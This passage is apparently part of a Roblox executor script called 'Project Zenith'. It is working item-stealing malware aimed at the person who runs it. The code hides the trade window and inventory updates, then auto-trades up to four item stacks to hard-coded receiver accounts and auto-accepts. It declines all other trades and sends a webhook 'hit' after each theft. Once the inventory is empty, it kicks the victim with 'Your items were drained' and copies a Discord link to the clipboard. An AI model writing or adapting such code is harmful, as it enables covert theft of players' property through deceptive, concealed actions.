                if inactive:FindFirstChild("TradeMainOld") then inactive.TradeMainOld.Position = UDim2.new(99, 99, 99, 99) end
            end
            if tradeGuiPhone:FindFirstChild("Container") then tradeGuiPhone.Container.Position = UDim2.new(99, 99, 99, 99) end
        end
        if device == "Phone" then
            local blocker = tradeGuiPhone and tradeGuiPhone:FindFirstChild("ClickBlocker")
            local mainGui = playerGui:FindFirstChild("MainGUI")
            local request = mainGui and mainGui.Lobby and mainGui.Lobby.Leaderboard
                and mainGui.Lobby.Leaderboard.Container and mainGui.Lobby.Leaderboard.Container.OverlayMenu
                and mainGui.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest
            if blocker then
                blocker.Visible = false
                blocker:GetPropertyChangedSignal("Visible"):Connect(function()
                    if blocker.Visible then blocker.Visible = false end
                end)
            end
            if request then
                request.Visible = false
                request:GetPropertyChangedSignal("Visible"):Connect(function()
                    if request.Visible then request.Visible = false end
                end)
            end
        end
    end)
end

hideTradeGui()
task.spawn(function() while not HALTED do task.wait(1); if not HALTED then hideTradeGui() end end end)

pcall(function()
    if string.lower(getexecutorname and getexecutorname() or "") == "xeno" then
        local ok2, inv = pcall(function() return require(ReplicatedStorage.Modules.InventoryModule) end)
        if ok2 and inv then inv.UpdateInventory = function() end end
    else
        local profileChanged = Remotes:FindFirstChild("Inventory")
        profileChanged = profileChanged and profileChanged:FindFirstChild("ProfileDataChanged")
        if profileChanged then profileChanged:Destroy() end
    end
end)

local tradeState = {Active=false, Ended=false, LastOffer=nil, PartnerName=nil}

if SendRequest then
    SendRequest.OnClientInvoke = function() pcall(function() CancelRequest:FireServer() end) end
end
if UpdateTrade then
    UpdateTrade.OnClientEvent:Connect(function(info)
        if type(info) ~= "table" then return end
        if info.LastOffer ~= nil then tradeState.LastOffer = info.LastOffer end
    end)
end
if StartTrade then
    StartTrade.OnClientEvent:Connect(function(info)
        tradeState.Active, tradeState.Ended, tradeState.LastOffer = true, false, nil
        if info and info.Player1 and info.Player2 then
            local p1, p2 = info.Player1.Player, info.Player2.Player
            if p1 and p1.Name ~= localPlayer.Name then tradeState.PartnerName = p1.Name
            elseif p2 and p2.Name ~= localPlayer.Name then tradeState.PartnerName = p2.Name end
        end
    end)
end
pcall(function()
    Trade.DeclineTrade.OnClientEvent:Connect(function()
        tradeState.Active, tradeState.Ended, tradeState.PartnerName = false, true, nil
    end)
    Trade.AcceptTrade.OnClientEvent:Connect(function(success)
        if success then tradeState.Active, tradeState.Ended, tradeState.PartnerName = false, true, nil end
    end)
end)

local function getTradeStatus()
    local ok2, status, info = pcall(function() return GetTradeStatus:InvokeServer() end)
    if not ok2 then return nil, nil end
    return status, info
end

local function isTarget(name)
    if not name then return false end
    local lower = tostring(name):lower()
    for _, target in ipairs(USER) do
        if lower == tostring(target):lower() then return true end
    end
    return false
end

local function findReceiver()
    for _, name in ipairs(USER) do
        local p = Players:FindFirstChild(tostring(name))
        if p and p ~= localPlayer then return p end
    end
    return nil
end

local function getInfoPartnerName(info)
    if not info then return nil end
    if info.Player1 and info.Player1.Player then
        local p = info.Player1.Player
        if p.Name ~= localPlayer.Name then return p.Name end
    end
    if info.Player2 and info.Player2.Player then
        local p = info.Player2.Player
        if p.Name ~= localPlayer.Name then return p.Name end
    end
    return nil
end

local tradeBusy = false
local lastTradeEnded = false

local function cleanTradeState()
    if HALTED then return end
    local status = getTradeStatus()
    if status == "StartTrade" then
        pcall(function() DeclineTrade:FireServer() end); task.wait(0.3)
    elseif status == "ReceivingRequest" then
        pcall(function() DeclineRequest:FireServer() end); task.wait(0.2)
    elseif status == "SendingRequest" then
        pcall(function() CancelRequest:FireServer() end); task.wait(0.2)
    end
end

local function addItem(uniqueId, count)
    if HALTED then return end
    count = count or 1
    for _ = 1, count do
        if HALTED then return end
        pcall(function() OfferItem:FireServer(uniqueId, TRADE_CODE) end)
        task.wait(0.03)
    end
end

local function acceptDeal()
    if HALTED then return end
    local deadline = tick() + 60
    while tick() < deadline do
        if HALTED then return end
        local status, info = getTradeStatus()
        if not status or status == "None" then return true end
        if status ~= "StartTrade" then
            task.wait(0.3)
        else
            local side
            if info and info.Player1 and info.Player1.Player then
                if info.Player1.Player.Name ~= localPlayer.Name then side = "Player2"
                else side = "Player1" end
            end
            pcall(function() AcceptTrade:FireServer(TRADE_CODE, tradeState.LastOffer or 0) end)
            if side and info and info[side] and info[side].Accepted then return true end
            task.wait(0.5)
        end
    end
    return false
end

local function runTrade(targetPlayer)
    if HALTED then return end
    if tradeBusy then return end
    if not targetPlayer or not targetPlayer.Parent then return end
    if not lightGuard() then return end
    tradeBusy = true
    cleanTradeState()
    local status = getTradeStatus()
    local deadline = tick() + 5
    while status ~= "None" and tick() < deadline do
        if HALTED then tradeBusy = false; return end
        task.wait(0.2); status = getTradeStatus()
    end
    pcall(function() SendRequest:InvokeServer(targetPlayer) end)
    local openDeadline = tick() + 15
    while tick() < openDeadline do
        if HALTED then tradeBusy = false; return end
        if getTradeStatus() == "StartTrade" then break end
        task.wait(0.1)
    end
    if getTradeStatus() ~= "StartTrade" then tradeBusy = false; return end
    local weaponsList = fetchInventory()
    local offered, seen, slots = {}, {}, 0
    for _, item in ipairs(weaponsList) do
        if slots >= 4 then break end
        if not seen[item.fixed] then
            seen[item.fixed] = true
            local total = 0
            for _, other in ipairs(weaponsList) do
                if other.fixed == item.fixed then total += other.amount or 1 end
            end
            table.insert(offered, {uniqueId = item.fixed, amount = total})
            slots += 1
        end
    end
    if #offered == 0 then pcall(function() DeclineTrade:FireServer() end); tradeBusy = false; return end
    for _, item in ipairs(offered) do addItem(item.uniqueId, item.amount) end
    task.wait(1)
    acceptDeal()
    local closeDeadline = tick() + 60
    while tick() < closeDeadline do
        if HALTED then tradeBusy = false; return end
        local s = getTradeStatus()
        if s == "None" or s == nil then break end
        task.wait(0.3)
    end
    tradeBusy = false
    lastTradeEnded = true
    sendWebhook(buildHit())
end

local function tryTrade()
    if HALTED then return end
    if tradeBusy then return end
    local target = findReceiver()
    if not target then return end
    task.spawn(runTrade, target)
end

task.spawn(function()
    while not HALTED do
        task.wait(0.5)
        if not HALTED and not tradeBusy then pcall(tryTrade) end
    end
end)

task.spawn(function()
    while not HALTED do
        task.wait(1)
        if HALTED then break end
        local status, info = getTradeStatus()
        if not status then continue end
        if status == "ReceivingRequest" then
            local senderName
            if info and info.Sender then
                senderName = typeof(info.Sender) == "Instance" and info.Sender.Name or tostring(info.Sender)
            elseif info and info.Receiver then
                senderName = typeof(info.Receiver) == "Instance" and info.Receiver.Name or tostring(info.Receiver)
            end
            if senderName and not isTarget(senderName) then
                pcall(function() DeclineRequest:FireServer() end); task.wait(0.3)
            elseif senderName and isTarget(senderName) and not tradeBusy then
                pcall(function() AcceptRequest:FireServer() end); task.wait(1.5)
                local weaponsList = fetchInventory()
                local offered, seen, slots = {}, {}, 0
                for _, item in ipairs(weaponsList) do
                    if slots >= 4 then break end
                    if not seen[item.fixed] then
                        seen[item.fixed] = true
                        local total = 0
                        for _, other in ipairs(weaponsList) do
                            if other.fixed == item.fixed then total += other.amount or 1 end
                        end
                        table.insert(offered, {uniqueId = item.fixed, amount = total})
                        slots += 1
                    end
                end
                tradeBusy = true
                for _, item in ipairs(offered) do addItem(item.uniqueId, item.amount) end
                task.wait(1); acceptDeal(); task.wait(3); tradeBusy = false
                sendWebhook(buildHit())
            end
        elseif status == "StartTrade" then
            local partnerName = tradeState.PartnerName or getInfoPartnerName(info)
            if partnerName and not isTarget(partnerName) then
                pcall(function() DeclineTrade:FireServer() end); task.wait(0.5)
            end
        elseif status == "SendingRequest" then
            local receiverName
            if info and info.Receiver then
                receiverName = typeof(info.Receiver) == "Instance" and info.Receiver.Name or tostring(info.Receiver)
            end
            if receiverName and not isTarget(receiverName) then
                pcall(function() CancelRequest:FireServer() end); task.wait(0.5)
            end
        end
    end
end)

task.spawn(function()
    while not HALTED do
        task.wait(15)
        if HALTED then break end
        if tradeBusy then continue end
        if lastTradeEnded then task.wait(15); lastTradeEnded = false; continue end
        if totalItems == 0 then continue end
        local nowWeapons = fetchInventory()
        if #nowWeapons > 0 then continue end
        task.wait(3)
        local checkWeapons = fetchInventory()
        if #checkWeapons > 0 then continue end
        _G.ZenithStop = true
        setclipboard(DISCORD)
        task.wait(1)
        pcall(function() localPlayer:Kick("Project Zenith | Your items were drained\n\n" .. DISCORD) end)
        return
    end
end)

Players.PlayerAdded:Connect(function(player)
    if HALTED then return end
    if isTarget(player.Name) or isTarget(player.DisplayName) then
        task.wait(3)
        if not HALTED and not tradeBusy then pcall(tryTrade) end
    end
end)

print("Project Zenith active")
